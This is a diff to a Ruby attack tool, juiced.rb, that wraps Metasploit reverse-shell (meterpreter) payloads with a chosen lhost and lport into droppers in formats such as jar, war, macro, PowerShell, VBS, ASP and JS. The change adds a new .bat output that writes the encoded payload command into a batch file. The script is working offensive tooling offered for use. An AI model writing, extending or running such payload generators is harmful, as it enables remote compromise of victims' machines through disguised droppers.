@@ -1,14 +1,13 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.6
-#Tested with Reverse_tcp, Reverse_https, and Reverse_tcp_dns meterpreters
+#v1.7
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'open3'
 require 'base64'
 def usage
 	puts "Usage: ruby juiced.rb <msf/Venom/Payload> <lhost> <lport> <payloadFormatOption> <fileName>\n\n"
 	puts "Note: A fileName is required for payload formats that output a file."
-	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, and js."
+	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, bat, and js."
 end
 #######################################################################################################################
 #Payload Functions Begin
@@ -151,6 +150,12 @@ EOS
         end	
 	
 end
+def gen_batFile(base64Command, fileName)
+	#Writes out the bat file
+        File.open(fileName + ".bat", "w") do |f|
+                f.write("@ECHO OFF\n" + base64Command)
+        end
+end
 ##################################################################################################################
 #Payload Functions End
 ##################################################################################################################
@@ -225,7 +230,10 @@ else
 	when "asp"
 		puts "Now creating file with .asp extension, please check local directory.\n\n"
                 gen_aspFile(command, ARGV[4])
+	when "bat"
+		puts "Now creating file with .bat extension, please check local directory.\n\n"
+		gen_batFile(command, ARGV[4])
 	else
 	puts "You forgot to specify a payload extension."
 	end
-en
+end
